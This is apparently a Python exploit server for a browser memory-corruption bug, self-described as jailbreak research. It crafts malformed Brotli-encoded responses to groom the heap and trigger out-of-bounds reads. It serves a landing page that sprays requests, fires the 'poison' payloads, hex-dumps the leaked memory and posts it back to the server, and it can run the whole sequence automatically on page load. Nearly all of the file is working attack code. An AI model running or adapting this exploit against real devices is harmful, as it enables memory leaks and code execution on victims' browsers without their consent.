#!/usr/bin/env python3
"""Heap spray/groom server v2 for CVE-2026-111497.

Fixes from v1:
- Groom chunk delay reduced from 500ms to 20ms (prevents broken pipes)
- POST body parsing reads full Content-Length (fixes empty readback)
- Added /poison/leak endpoint with small prefix to maximize leaked bytes
- Added /poison/vary/<size> for testing different prefix sizes
- Binary poison response handling with full hex analysis

Educational jailbreak research. For use on devices you own.
"""

import hashlib, io, os, socket, ssl, struct, sys, threading, time, json


class Bits:
    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value):
        if self.used:
            raise ValueError("not byte-aligned")
        self.data.extend(value if isinstance(value, (bytes, bytearray)) else value)

    def finish(self):
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)

def _one_symbol_tree(bits, alphabet_size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())

def _varlen_u8(bits, value):
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def build_groom_stream(marker_byte, size=131072):
    bits = Bits()
    bits.put(1, 1); bits.put(0, 3); bits.put(2, 3)
    remaining = size
    while remaining > 0:
        chunk_size = min(remaining, 65536)
        is_last = (remaining - chunk_size) == 0
        bits.put(1 if is_last else 0, 1)
        if is_last:
            bits.put(0, 1)
        bits.put(0, 2)
        bits.put(chunk_size - 1, 16)
        bits.put(1, 1)
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(bytes([marker_byte]) * chunk_size)
        remaining -= chunk_size
    return bits.finish()


def generate_rce_stream(prefix, command_block_extra, max_commands=None):
    bits = Bits()
    bits.put(1, 1); bits.put(0, 3); bits.put(2, 3)
    if prefix:
        bits.put(0, 1); bits.put(0, 2)
        bits.put(len(prefix) - 1, 16); bits.put(1, 1)
        if bits.used: bits.put(0, 8 - bits.used)
        bits.aligned(prefix)
    bits.put(0, 1); bits.put(2, 2)
    bits.put(0xFFFFFF, 24); bits.put(0, 1)
    _varlen_u8(bits, 0); _varlen_u8(bits, 1)
    _one_symbol_tree(bits, 4, 0); _one_symbol_tree(bits, 26, 25)
    bits.put(command_block_extra, 24)
    _varlen_u8(bits, 0); bits.put(3, 6); bits.put(0, 2)
    _varlen_u8(bits, 0); _varlen_u8(bits, 0)
    _one_symbol_tree(bits, 256, 0); _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 704, 130); _one_symbol_tree(bits, 400, 184)
    distance_extra = (len(prefix) + 32) // 8 if prefix else 4
    command_count = max_commands if max_commands else (1 << 24)
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11); completed += 1
    group = Bits()
    for _ in range(8): group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail): bits.put(distance_extra, 11)
    return bits.finish()


leaked_data = []
leak_lock = threading.Lock()

GROOM_LANDING = """<!DOCTYPE html>
<html>
<head><title>Heap Spray v2</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui; max-width: 700px; margin: 1em auto; padding: 0 1em;
       background: #111; color: #eee; font-size: 14px; }
h1 { color: #f44; font-size: 1.5em; }
#log { background: #000; padding: 8px; border-radius: 6px; height: 400px;
       overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap; }
button { font-size: 1.1em; padding: 10px 20px; margin: 5px; border: none;
         border-radius: 6px; cursor: pointer; }
.go { background: #4a4; color: #fff; }
.stop { background: #a44; color: #fff; }
.info { background: #44a; color: #fff; }
.warn { background: #a84; color: #fff; }
</style>
</head>
<body>
<h1>Heap Spray Orchestrator v2</h1>
<div>
<button class="go" onclick="startSpray(16)">16 groom</button>
<button class="go" onclick="startSpray(32)">32 groom</button>
<button class="go" onclick="startSpray(64)">64 groom</button>
<button class="stop" onclick="firePoison()">Poison (1KB)</button>
<button class="stop" onclick="fireLeak()">Leak (16B pfx)</button>
<button class="warn" onclick="fireAndProbe()">Auto Sequence</button>
<button class="info" onclick="checkStatus()">Status</button>
</div>
<div id="log"></div>
<script>
const log = document.getElementById('log');
function L(msg) { log.textContent += new Date().toTimeString().slice(0,8) + ' ' + msg + '\\n'; log.scrollTop = log.scrollHeight; }

async function startSpray(n) {
    L('Starting spray: ' + n + ' groom...');
    for (let i = 0; i < n; i++) {
        fetch('/groom/' + i).then(async resp => {
            L('groom/' + i + ': ' + resp.status + ' len=' + resp.headers.get('content-length'));
            const reader = resp.body.getReader();
            let total = 0;
            while (true) { const {done, value} = await reader.read(); if (done) break; total += value.length; }
            L('groom/' + i + ': done ' + total + 'B');
        }).catch(e => { if (e.name !== 'AbortError') L('groom/' + i + ': ' + e.message); });
    }
    L('All ' + n + ' fetches launched');
}

async function analyzePoison(endpoint, label) {
    L('Firing ' + label + '...');
    try {
        const resp = await fetch(endpoint);
        const ab = await resp.arrayBuffer();
        const bytes = new Uint8Array(ab);
        L(label + ': ' + bytes.length + ' bytes');

        let hex = '';
        for (let i = 0; i < Math.min(128, bytes.length); i++) {
            hex += bytes[i].toString(16).padStart(2, '0');
            if ((i+1) % 32 === 0) hex += '\\n';
            else if ((i+1) % 4 === 0) hex += ' ';
        }
        L('HEAD:\\n' + hex);

        let tail = '';
        const start = Math.max(0, bytes.length - 64);
        for (let i = start; i < bytes.length; i++) {
            tail += bytes[i].toString(16).padStart(2, '0');
            if ((i - start + 1) % 32 === 0) tail += '\\n';
            else if ((i - start + 1) % 4 === 0) tail += ' ';
        }
        L('TAIL (last 64B):\\n' + tail);

        let deadbeef = 0, marker_41 = 0, zero = 0;
        for (let i = 0; i < bytes.length - 3; i++) {
            if (bytes[i]===0xEF && bytes[i+1]===0xBE && bytes[i+2]===0xAD && bytes[i+3]===0xDE) deadbeef++;
        }
        for (let i = 0; i < bytes.length; i++) {
            if (bytes[i] === 0x41) marker_41++;
            if (bytes[i] === 0) zero++;
        }
        let non_known = 0;
        for (let i = 0; i < bytes.length; i++) {
            if (bytes[i]!==0 && bytes[i]!==0xDE && bytes[i]!==0xAD && bytes[i]!==0xBE && bytes[i]!==0xEF
                && bytes[i]!==0x48 && bytes[i]!==0x41) non_known++;
        }
        L('DEADBEEF(LE): ' + deadbeef + ', 0x41: ' + marker_41 + ', zero: ' + zero + ', unknown: ' + non_known);

        let unique = new Set();
        for (let i = 0; i < bytes.length; i++) {
            if (bytes[i]!==0xDE && bytes[i]!==0xAD && bytes[i]!==0xBE && bytes[i]!==0xEF && bytes[i]!==0x48) {
                unique.add(bytes[i]);
            }
        }
        if (unique.size > 0) {
            L('Non-prefix bytes: [' + Array.from(unique).sort((a,b)=>a-b).map(b=>'0x'+b.toString(16).padStart(2,'0')).join(', ') + ']');
        }

        await sendProbe({
            type: label,
            total_bytes: bytes.length,
            deadbeef_le_count: deadbeef,
            marker_41_count: marker_41,
            zero_count: zero,
            non_known_count: non_known,
            head_hex: Array.from(bytes.slice(0, 256)).map(b => b.toString(16).padStart(2, '0')).join(''),
            tail_hex: Array.from(bytes.slice(Math.max(0, bytes.length - 256))).map(b => b.toString(16).padStart(2, '0')).join('')
        });
    } catch(e) { L(label + ' error: ' + e.message); }
}

function firePoison() { analyzePoison('/poison', 'poison-1kb'); }
function fireLeak() { analyzePoison('/poison/leak', 'leak-16b'); }

async function sendProbe(data) {
    try {
        const body = JSON.stringify(data);
        const resp = await fetch('/probe/readback', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: body
        });
        const result = await resp.json();
        L('Probe: ' + result.status + ' (count=' + result.count + ')');
    } catch(e) { L('Probe error: ' + e.message); }
}

async function fireAndProbe() {
    L('=== FULL SEQUENCE: spray -> wait -> poison -> leak ===');
    await startSpray(16);
    L('Waiting 3s for ring buffers...');
    await new Promise(r => setTimeout(r, 3000));
    await analyzePoison('/poison', 'poison-1kb');
    L('Waiting 1s...');
    await new Promise(r => setTimeout(r, 1000));
    await analyzePoison('/poison/leak', 'leak-16b');
    L('=== SEQUENCE COMPLETE ===');
}

async function checkStatus() {
    try {
        const resp = await fetch('/spray/status');
        const data = await resp.json();
        L('Status: ' + JSON.stringify(data, null, 2));
    } catch(e) { L('Status error: ' + e.message); }
}

if (location.hash === '#auto') {
    setTimeout(() => fireAndProbe(), 1000);
}
</script>
</body>
</html>"""

def _read_full_body(ssl_sock, initial_data):
    header_end = initial_data.find(b"\r\n\r\n")
    if header_end < 0:
        return b""
    headers_part = initial_data[:header_end].decode("utf-8", errors="replace")
    body = initial_data[header_end + 4:]
    content_length = 0
    for line in headers_part.split("\r\n"):
        if line.lower().startswith("content-length:"):
            content_length = int(line.split(":", 1)[1].strip())
            break
    while len(body) < content_length:
        try:
            chunk = ssl_sock.recv(min(8192, content_length - len(body)))
            if not chunk: break
            body += chunk
        except (socket.timeout, ssl.SSLError): break
    return body


def _send_response(ssl_sock, status, content_type, body, extra_headers=b""):
    if isinstance(body, str): body = body.encode("utf-8")
    resp = (
        f"HTTP/1.1 {status}\r\n".encode()
        + f"Content-Type: {content_type}\r\n".encode()
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n"
        + b"Cache-Control: no-store\r\n"
        + b"Access-Control-Allow-Origin: *\r\n"
        + extra_headers
        + b"\r\n" + body
    )
    ssl_sock.sendall(resp)


def handle_client(ssl_sock, addr):
    try:
        ssl_sock.settimeout(300)
        request = ssl_sock.recv(8192)
        if not request: return
        req_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        parts_raw = req_line.split(" ", 2)
        if len(parts_raw) < 2: return
        method, path = parts_raw[0], parts_raw[1]
        print(f"[{addr[0]}:{addr[1]}] {method} {path}")

        if path == "/" or path.startswith("/groom/landing"):
            _send_response(ssl_sock, "200 OK", "text/html", GROOM_LANDING)

        elif path.startswith("/groom/"):
            slot = path.split("/")[2]
            marker = (int(slot) % 254) + 1
            groom_data = build_groom_stream(marker, 131072)
            print(f"  -> GROOM slot={slot} marker=0x{marker:02x} stream={len(groom_data)}B")
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                b"Content-Encoding: br\r\n"
                + f"Content-Length: {len(groom_data)}\r\n".encode()
                + b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n\r\n"
            )
            ssl_sock.sendall(headers)
            chunk_size = 8192
            for i in range(0, len(groom_data), chunk_size):
                ssl_sock.sendall(groom_data[i:i + chunk_size])
                if i + chunk_size < len(groom_data):
                    time.sleep(0.02)
            print(f"  -> GROOM slot={slot} complete")

        elif path == "/poison":
            prefix = bytearray(1024)
            for i in range(0, 1024, 4):
                struct.pack_into("<I", prefix, i, 0xDEADBEEF)
            payload = generate_rce_stream(bytes(prefix), 0xFFFFFF, max_commands=40000) + b"\x00" * 3
            print(f"  -> POISON: 40K cmd, 1KB DEADBEEF, total={len(payload)}B")
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                + f"Content-Length: {len(payload)}\r\n".encode()
                + b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n"
                b"Access-Control-Allow-Origin: *\r\n\r\n"
            )
            ssl_sock.sendall(headers + payload)

        elif path == "/poison/leak":
            prefix = b"\x41" * 16
            payload = generate_rce_stream(prefix, 0xFFFFFF, max_commands=40000) + b"\x00" * 3
            print(f"  -> LEAK: 40K cmd, 16B prefix, total={len(payload)}B")
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                + f"Content-Length: {len(payload)}\r\n".encode()
                + b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n"
                b"Access-Control-Allow-Origin: *\r\n\r\n"
            )
            ssl_sock.sendall(headers + payload)

        elif path.startswith("/poison/vary/"):
            psize = int(path.split("/")[3])
            prefix = bytearray(psize)
            for i in range(0, psize, 4):
                struct.pack_into("<I", prefix, i, 0xCAFEBABE)
            payload = generate_rce_stream(bytes(prefix), 0xFFFFFF, max_commands=40000) + b"\x00" * 3
            print(f"  -> VARY: 40K cmd, {psize}B CAFEBABE, total={len(payload)}B")
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                + f"Content-Length: {len(payload)}\r\n".encode()
                + b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n"
                b"Access-Control-Allow-Origin: *\r\n\r\n"
            )
            ssl_sock.sendall(headers + payload)

        elif path == "/probe/readback" and method == "POST":
            body = _read_full_body(ssl_sock, request)
            if body:
                try:
                    data = json.loads(body)
                    with leak_lock:
                        leaked_data.append(data)
                    print(f"  -> PROBE: {len(body)}B, type={data.get('type', '?')}")
                    if 'head_hex' in data:
                        print(f"     head: {data['head_hex'][:80]}...")
                    if 'tail_hex' in data:
                        print(f"     tail: ...{data['tail_hex'][-80:]}")
                    for k in ('deadbeef_le_count', 'non_known_count', 'marker_41_count', 'zero_count'):
                        if k in data: print(f"     {k}: {data[k]}")
                except json.JSONDecodeError as e:
                    print(f"  -> PROBE: JSON error: {e}")
            else:
                print(f"  -> PROBE: empty body")
            with leak_lock: count = len(leaked_data)
            _send_response(ssl_sock, "200 OK", "application/json",
                          json.dumps({"status": "ok", "count": count}))

        elif path == "/spray/status":
            with leak_lock:
                data = {"leaked_count": len(leaked_data),
                        "leaked": leaked_data[-5:] if leaked_data else []}
            _send_response(ssl_sock, "200 OK", "application/json", json.dumps(data))

        elif path == "/favicon.ico":
            ssl_sock.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")

        elif method == "OPTIONS":
            ssl_sock.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Access-Control-Allow-Origin: *\r\n"
                b"Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
                b"Access-Control-Allow-Headers: Content-Type\r\n"
                b"Content-Length: 0\r\nConnection: close\r\n\r\n"
            )

        else:
            _send_response(ssl_sock, "404 Not Found", "text/plain", "404")

    except (ssl.SSLError, OSError, BrokenPipeError) as e:
        print(f"  -> Error: {e}")
    finally:
        try: ssl_sock.shutdown(socket.SHUT_RDWR)
        except OSError: pass
        ssl_sock.close()


def ensure_cert(cert_dir):
    certfile = os.path.join(cert_dir, "server.crt")
    keyfile = os.path.join(cert_dir, "server.key")
    if os.path.exists(certfile) and os.path.exists(keyfile):
        return certfile, keyfile
    import subprocess
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", keyfile, "-out", certfile,
        "-days", "365", "-subj", "/CN=192.168.1.155",
        "-addext", "subjectAltName=IP:192.168.1.155"
    ], check=True)
    return certfile, keyfile


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4448
    cert_dir = os.path.dirname(os.path.abspath(__file__))
    certfile, keyfile = ensure_cert(cert_dir)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(50)

    print(f"Groom/spray server v2 on https://0.0.0.0:{port}/")
    print(f"Landing: https://192.168.1.155:{port}/groom/landing")
    print(f"Endpoints: /poison, /poison/leak, /poison/vary/<size>")
    print(f"Auto: https://192.168.1.155:{port}/groom/landing#auto")
    print()

    while True:
        try:
            client_sock, addr = sock.accept()
            try:
                ssl_sock = ctx.wrap_socket(client_sock, server_side=True)
            except ssl.SSLError as e:
                print(f"[{addr[0]}] SSL error: {e}")
                client_sock.close()
                continue
            t = threading.Thread(target=handle_client, args=(ssl_sock, addr), daemon=True)
            t.start()
        except KeyboardInterrupt:
            print("\nShutting down...")
            break
    sock.close()


if __name__ == "__main__":
    main()
